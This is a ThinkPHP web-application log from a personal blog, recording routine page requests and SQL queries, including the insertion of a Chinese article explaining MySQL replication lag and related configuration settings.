么slave会延时？”，答案是master可以并发，Slave_SQL_Running线程却不可以。</p><p style=\"margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">2. MySQL数据库主从同步延迟是怎么产生的。</p><p style=\"margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">答：当主库的TPS并发较高时，产生的DDL数量超过slave一个sql线程所能承受的范围，那么延时就产生了，当然还有就是可能与slave的大型query语句产生了锁等待。</p><p style=\"margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">3. MySQL数据库主从同步延迟解决方案</p><p style=\"margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">答：最简单的减少slave同步延时的方案就是在架构上做优化，尽量让主库的DDL快速执行。还有就是主库是写，对数据安全性较高，比如 sync_binlog=1，innodb_flush_log_at_trx_commit = 1 之类的设置，而slave则不需要这么高的数据安全，完全可以讲sync_binlog设置为0或者关闭binlog，innodb_flushlog也 可以设置为0来提高sql的执行效率。另外就是使用比主库更好的硬件设备作为slave。</p><p style=\"margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"margin: 0px; padding: 0px; color: rgb(136, 136, 136);\"><strong style=\"margin: 0px; padding: 0px;\">附加：</strong></span></p><p style=\"margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"margin: 0px; padding: 0px; color: rgb(136, 136, 136);\"><strong style=\"margin: 0px; padding: 0px;\">sync_binlog 配置说明：</strong></span></p><p style=\"margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"margin: 0px; padding: 0px; color: rgb(136, 136, 136);\"><strong style=\"margin: 0px; padding: 0px;\">sync_binlog”：这个参数是对于MySQL系统来说是至关重要的，他不仅影响到Binlog对MySQL所带来的性能损耗，而且还影响到MySQL中数据的完整性。对于“sync_binlog”参数的各种设置的说明如下：</strong></span></p><p style=\"margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"margin: 0px; padding: 0px; color: rgb(136, 136, 136);\"><strong style=\"margin: 0px; padding: 0px;\">sync_binlog=0，当事务提交之后，MySQL不做fsync之类的磁盘同步指令刷新binlog_cache中的信息到磁盘，而让Filesystem自行决定什么时候来做同步，或者cache满了之后才同步到磁盘。</strong></span></p><p style=\"margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"margin: 0px; padding: 0px; color: rgb(136, 136, 136);\"><strong style=\"margin: 0px; padding: 0px;\">sync_binlog=n，当每进行n次事务提交之后，MySQL将进行一次fsync之类的磁盘同步指令来将binlog_cache中的数据强制写入磁盘。</strong></span></p><p style=\"margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"margin: 0px; padding: 0px; color: rgb(136, 136, 136);\"><strong style=\"margin: 0px; padding: 0px;\">在MySQL中系统默认的设置是sync_binlog=0，也就是不做任何强制性的磁盘刷新指令，这时候的性能是最好的，但是风险也是最大的。因为一旦系统Crash，在binlog_cache中的所有binlog信息都会被丢失。而当设置为“1”的时候，是最安全但是性能损耗最大的设置。因为当设置为1的时候，即使系统Crash，也最多丢失binlog_cache中未完成的一个事务，对实际数据没有任何实质性影响。</strong></span></p><p style=\"margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"margin: 0px; padding: 0px; color: rgb(136, 136, 136);\"><strong style=\"margin: 0px; padding: 0px;\">从以往经验和相关测试来看，对于高并发事务的系统来说，“sync_binlog”设置为0和设置为1的系统写入性能差距可能高达5倍甚至更多。</strong></span></p><p style=\"margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"margin: 0px; padding: 0px; color: rgb(136, 136, 136);\"><strong style=\"margin: 0px; padding: 0px;\">innodb_flush_log_at_trx_commit 配置说明：</strong></span></p><p style=\"margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"margin: 0px; padding: 0px; color: rgb(136, 136, 136);\"><strong style=\"margin: 0px; padding: 0px;\">默认值1的意思是每一次事务提交或事务外的指令都需要把日志写入（flush）硬盘，这是很费时的。特别是使用电 池供电缓存（Battery backed up cache）时。设成2对于很多运用，特别是从MyISAM表转过来的是可以的，它的意思是不写入硬盘而是写入系统缓存。日志仍然会每秒flush到硬 盘，所以你一般不会丢失超过1-2秒的更新。设成0会更快一点，但安全方面比较差，即使MySQL挂了也可能会丢失事务的数据。而值2只会在整个操作系统 挂了时才可能丢数据。&nbsp;</strong></span></p><p style=\"margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">&nbsp;</p><p style=\"margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">&nbsp;</p><p style=\"margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">mysql-5.6.3已经支持了多线程的主从复制。原理和丁奇的类似，丁奇的是以表做多线程，Oracle使用的是以数据库(schema)为单位做多线程，不同的库可以使用不同的复制线程。</p><p style=\"margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">&nbsp;</p><p style=\"margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">基于局域网的master/slave机制在通常情况下已经可以满足&#39;实时&#39;备份的要求了。如果延迟比较大，就先确认以下几个因素：&nbsp;<br style=\"margin: 0px; padding: 0px;\"/>1. 网络延迟<br style=\"margin: 0px; padding: 0px;\"/>2. master负载<br style=\"margin: 0px; padding: 0px;\"/>3. slave负载<br style=\"margin: 0px; padding: 0px;\"/>一般的做法是，使用多台slave来分摊读请求，再从这些slave中取一台专用的服务器，只作为备份用，不进行其他任何操作，就能相对最大限度地达到&#39;实时&#39;的要求了</p><p style=\"margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">slave_net_timeout单位为秒 默认设置为 3600秒</p><p style=\"margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">参数含义：当slave从主数据库读取log数据失败后，等待多久重新建立连接并获取数据</p><p style=\"margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">master-connect-retry单位为秒 默认设置为 60秒</p><p style=\"margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">参数含义：当重新建立主从连接时，如果连接建立失败，间隔多久后重试。</p><p style=\"margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">通常配置以上2个参数可以减少网络问题导致的主从数据同步延迟</p><p style=\"margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">&nbsp;</p><p style=\"margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">判断主从延时，通常有两个方法：</p><p style=\"margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">1.&nbsp;Seconds_Behind_Master &nbsp;vs &nbsp;2. mk-heartbeat，下面具体说下两者在实现功能的差别。</p><p style=\"margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">可以通过监控show slave status\\G命令输出的Seconds_Behind_Master参数的值来判断，是否有发生主从延时。<br style=\"margin: 0px; padding: 0px;\"/>其值有这么几种：<br style=\"margin: 0px; padding: 0px;\"/>NULL - 表示io_thread或是sql_thread有任何一个发生故障，也就是该线程的Running状态是No,而非Yes.<br style=\"margin: 0px; padding: 0px;\"/>0 - 该值为零，是我们极为渴望看到的情况，表示主从复制良好，可以认为lag不存在。<br style=\"margin: 0px; padding: 0px;\"/>正值 - 表示主从已经出现延时，数字越大表示从库落后主库越多。<br style=\"margin: 0px; padding: 0px;\"/>负值 - 几乎很少见，只是听一些资深的DBA说见过，其实，这是一个BUG值，该参数是不支持负值的，也就是不应该出现。</p><p style=\"margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">Seconds_Behind_Master是通过比较sql_thread执行的event的timestamp和io_thread复制好的 event的timestamp(简写为ts)进行比较，而得到的这么一个差值。我们都知道的relay-log和主库的bin-log里面的内容完全一 样，在记录sql语句的同时会被记录上当时的ts，所以比较参考的值来自于binlog，其实主从没有必要与NTP进行同步，也就是说无需保证主从时钟的 一致。你也会发现，其实比较真正是发生在io_thread与sql_thread之间，而io_thread才真正与主库有关联，于是，问题就出来了， 当主库I/O负载很大或是网络阻塞，io_thread不能及时复制binlog（没有中断，也在复制），而sql_thread一直都能跟上 io_thread的脚本，这时Seconds_Behind_Master的值是0，也就是我们认为的无延时，但是，实际上不是，你懂得。这也就是为什 么大家要批判用这个参数来监控数据库是否发生延时不准的原因，但是这个值并不是总是不准，如果当io_thread与master网络很好的情况下，那么 该值也是很有价值的。（就好比：妈–儿子–媳妇的关系，妈与儿子亲人，媳妇和儿子也亲人，不见得媳妇与妈就很亲。开个玩笑:-）之前，提到 Seconds_Behind_Master这个参数会有负值出现，我们已经知道该值是io_thread的最近跟新的ts与sql_thread执行到 的ts差值，前者始终是大于后者的，唯一的肯能就是某个event的ts发生了错误，比之前的小了，那么当这种情况发生时，负值出现就成为可能。</p><p style=\"margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">方法2. mk-heartbeat，Maatkit万能工具包中的一个工具，被认为可以准确判断复制延时的方法。</p><p style=\"margin: 10px auto; padding: 0px; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 14px; white-space: normal; background-color: rgb(255, 255, 255);\">mk-heartbeat的实现也是借助timestmp的比较实现的，它首先需要保证主从服务器必须要保持一致，通过与相同的一个NTP server同步时钟。它需要在主库上创建一个heartbeat的表，里面至少有id与ts两个字段，id为server_id，ts就是当前的时间戳 now()，该结构也会被复制到从库上，表建好以后，会在主库上以后台进程的模式去执行一行更新操作的命令，定期去向表中的插入数据，这个周期默认为1 秒，同时从库也会在后台执行一个监控命令，与主库保持一致的周期去比较，复制过来记录的ts值与主库上的同一条ts值，差值为0表示无延时，差值越大表示 延时的秒数越多。我们都知道复制是异步的ts不肯完全一致，所以该工具允许半秒的差距，在这之内的差异都可忽略认为无延时。这个工具就是通过实打实的复 制，巧妙的借用timestamp来检查延时，赞一个！</p><p><br/></p>' , 1 , 1 , 1 , '韩会强' , 'images/j663qk7s_f2c8bdf03tj598c06570d77c.jpg' , '123.233.116.122' , 1502348887 , 1502348887) [ RunTime:0.003708s ]

---------------------------------------------------------------
[ 2017-08-10T15:08:08+08:00 ] 172.17.180.47 123.233.116.122 GET /admin/article/index.html
[ log ] www.hhqblog.com/admin/article/index.html [运行时间：0.026096s][吞吐率：38.32req/s] [内存消耗：3,754.84kb] [文件加载：53]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'article',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.hhqblog.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'referer' => 'http://www.hhqblog.com/admin/article/add_article.html',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => 'bdshare_firstime=1502176507013; _pk_ref.1.c6f5=%5B%22%22%2C%22%22%2C1502348206%2C%22http%3A%2F%2Fhhqblog.com%2F%22%5D; _pk_id.1.c6f5=8954b2a892899c3c.1500952384.9.1502348229.1502348206.; _pk_ses.1.c6f5=*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\admin\controller\Article->index[ /yjdata/www/hhqblog/application/admin/controller/Article.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/admin/view/article/index.html [ array (
  0 => 'allpage',
  1 => 'current',
  2 => 'keyword',
  3 => 'count',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000313s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000822s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` LIMIT 1 [ RunTime:0.000154s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` ORDER BY a.id desc LIMIT 0,10 [ RunTime:0.000810s ]

---------------------------------------------------------------
[ 2017-08-10T15:08:09+08:00 ] 172.17.180.47 123.233.116.122 GET /admin/article/index.html?page=1&keyword=
[ log ] www.hhqblog.com/admin/article/index.html?page=1&keyword= [运行时间：0.028976s][吞吐率：34.51req/s] [内存消耗：3,685.72kb] [文件加载：52]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'article',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.hhqblog.com',
  'connection' => 'keep-alive',
  'accept' => 'application/json, text/javascript, */*; q=0.01',
  'x-requested-with' => 'XMLHttpRequest',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'referer' => 'http://www.hhqblog.com/admin/article/index.html',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => 'bdshare_firstime=1502176507013; _pk_ref.1.c6f5=%5B%22%22%2C%22%22%2C1502348206%2C%22http%3A%2F%2Fhhqblog.com%2F%22%5D; _pk_id.1.c6f5=8954b2a892899c3c.1500952384.9.1502348229.1502348206.; _pk_ses.1.c6f5=*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'page' => '1',
  'keyword' => '',
)
[ info ] [ RUN ] app\admin\controller\Article->index[ /yjdata/www/hhqblog/application/admin/controller/Article.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000301s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000821s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` LIMIT 1 [ RunTime:0.000178s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` ORDER BY a.id desc LIMIT 0,10 [ RunTime:0.000782s ]

---------------------------------------------------------------
[ 2017-08-10T15:21:34+08:00 ] 172.17.180.47 106.11.153.67 GET /index/index/index/cate_id/14.html
[ log ] www.hhqblog.com/index/index/index/cate_id/14.html [运行时间：0.033015s][吞吐率：30.29req/s] [内存消耗：5,618.95kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'index',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-cn,en-us,zh-tw,en-gb,en;',
  'host' => 'www.hhqblog.com',
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'connection' => 'Keep-Alive',
  'user-agent' => 'YisouSpider',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'cate_id' => '14',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /yjdata/www/hhqblog/application/index/controller/Index.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/index/index.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'list',
  5 => 'allpage',
  6 => 'top_line',
  7 => 'carousel',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000318s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000846s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000729s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 2 ORDER BY id desc LIMIT 6 [ RunTime:0.000449s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` WHERE  `status` = 1 LIMIT 1 [ RunTime:0.000381s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` WHERE  `a`.`status` = 1 ORDER BY id desc LIMIT 0,15 [ RunTime:0.000770s ]

---------------------------------------------------------------
[ 2017-08-10T17:01:06+08:00 ] 172.17.180.47 180.76.15.136 GET /ar/26
[ log ] www.hhqblog.com/ar/26 [运行时间：0.032357s][吞吐率：30.91req/s] [内存消耗：4,171.83kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'Artical',
    2 => 'detail',
  ),
  'convert' => false,
)
[ info ] [ HEADER ] array (
  'host' => 'www.hhqblog.com',
  'connection' => 'close',
  'user-agent' => 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
  'accept-encoding' => 'gzip',
  'accept-language' => 'en-US',
  'accept' => '*/*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'id' => '26',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Artical->detail[ /yjdata/www/hhqblog/application/index/controller/Artical.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/artical/detail.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'article',
  5 => 'allpage',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000284s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000798s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `is_tui` = 1 ORDER BY id desc LIMIT 8 [ RunTime:0.000890s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1 ORDER BY id desc LIMIT 8 [ RunTime:0.000380s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000482s ]
[ sql ] [ SQL ] SELECT `a`.*,`ca`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ca` ON `a`.`cate_id`=`ca`.`id` WHERE  `a`.`id` = 26 LIMIT 1 [ RunTime:0.000228s ]

---------------------------------------------------------------
[ 2017-08-10T17:24:19+08:00 ] 172.17.180.47 123.233.116.122 GET /admin
[ log ] hhqblog.com/admin [运行时间：0.015121s][吞吐率：66.13req/s] [内存消耗：1,977.91kb] [文件加载：44]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'hhqblog.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => '_pk_id.1.3fef=5dce351e789a92be.1500950707.10.1502335368.1502335210.',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\admin\controller\Index->index[ /yjdata/www/hhqblog/application/admin/controller/Index.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/admin/view/public/index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-08-10T17:24:19+08:00 ] 172.17.180.47 123.233.116.122 GET /admin/index/main.html
[ log ] hhqblog.com/admin/index/main.html [运行时间：0.014684s][吞吐率：68.10req/s] [内存消耗：1,900.90kb] [文件加载：43]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'index',
    2 => 'main',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'hhqblog.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'referer' => 'http://hhqblog.com/admin',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => '_pk_id.1.3fef=5dce351e789a92be.1500950707.10.1502335368.1502335210.',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\admin\controller\Index->main[ /yjdata/www/hhqblog/application/admin/controller/Index.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/admin/view/index/index.html [ array (
  0 => 'info',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-08-10T17:24:24+08:00 ] 172.17.180.47 123.233.116.122 GET /admin/article/index.html
[ log ] hhqblog.com/admin/article/index.html [运行时间：0.026784s][吞吐率：37.34req/s] [内存消耗：3,754.67kb] [文件加载：53]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'article',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'hhqblog.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'referer' => 'http://hhqblog.com/admin',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => '_pk_id.1.3fef=5dce351e789a92be.1500950707.10.1502335368.1502335210.',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\admin\controller\Article->index[ /yjdata/www/hhqblog/application/admin/controller/Article.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/admin/view/article/index.html [ array (
  0 => 'allpage',
  1 => 'current',
  2 => 'keyword',
  3 => 'count',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000314s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000882s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` LIMIT 1 [ RunTime:0.000220s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` ORDER BY a.id desc LIMIT 0,10 [ RunTime:0.000835s ]

---------------------------------------------------------------
[ 2017-08-10T17:24:24+08:00 ] 172.17.180.47 123.233.116.122 GET /admin/article/index.html?page=1&keyword=
[ log ] hhqblog.com/admin/article/index.html?page=1&keyword= [运行时间：0.030864s][吞吐率：32.40req/s] [内存消耗：3,685.59kb] [文件加载：52]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'article',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'hhqblog.com',
  'connection' => 'keep-alive',
  'accept' => 'application/json, text/javascript, */*; q=0.01',
  'x-requested-with' => 'XMLHttpRequest',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'referer' => 'http://hhqblog.com/admin/article/index.html',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => '_pk_id.1.3fef=5dce351e789a92be.1500950707.10.1502335368.1502335210.',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'page' => '1',
  'keyword' => '',
)
[ info ] [ RUN ] app\admin\controller\Article->index[ /yjdata/www/hhqblog/application/admin/controller/Article.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000305s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.001936s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` LIMIT 1 [ RunTime:0.000202s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` ORDER BY a.id desc LIMIT 0,10 [ RunTime:0.000868s ]

---------------------------------------------------------------
[ 2017-08-10T17:24:27+08:00 ] 172.17.180.47 123.233.116.122 GET /admin/article/add_article.html
[ log ] hhqblog.com/admin/article/add_article.html [运行时间：0.022938s][吞吐率：43.60req/s] [内存消耗：2,989.70kb] [文件加载：51]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'article',
    2 => 'add_article',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'hhqblog.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'referer' => 'http://hhqblog.com/admin/article/index.html',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => '_pk_id.1.3fef=5dce351e789a92be.1500950707.10.1502335368.1502335210.',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
